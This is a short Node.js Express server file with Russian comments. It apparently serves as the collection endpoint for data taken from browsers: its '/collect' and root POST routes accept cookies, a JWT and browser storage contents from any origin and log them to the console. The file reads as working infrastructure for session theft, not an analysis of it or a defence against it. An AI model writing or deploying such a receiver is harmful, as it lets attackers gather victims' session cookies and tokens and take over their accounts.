// server.js
const express = require('express');
const jwtLib  = require('jsonwebtoken');
const app     = express();

const JWT_SECRET = '…ваш секрет JWT…';

app.use(express.json());
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin',  '*');
  res.header('Access-Control-Allow-Methods', 'POST,OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type,Authorization');
  if (req.method === 'OPTIONS') return res.sendStatus(204);
  next();
});

function handleCollect(req, res) {
  const { cookies = [], jwt = null, storage = {}, timestamp = null } = req.body;
  let validJwt = false;
  if (jwt) {
    try { jwtLib.verify(jwt, JWT_SECRET); validJwt = true; }
    catch (e) { console.warn('Invalid JWT:', e.message); }
  }
  console.log('--- New collection @', timestamp);
  console.log('JWT valid:', validJwt);
  console.log('Cookies:', cookies);
  console.log('Storage keys:', Object.keys(storage).length);

  res.json({
    status: 'ok',
    jwtValid: validJwt,
    receivedCookies: cookies.length,
    receivedStorage: Object.keys(storage).length
  });
}

// теперь оба пути обрабатываются одинаково
app.post('/collect', handleCollect);
app.post('/',        handleCollect);

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server listening on ${PORT}`));
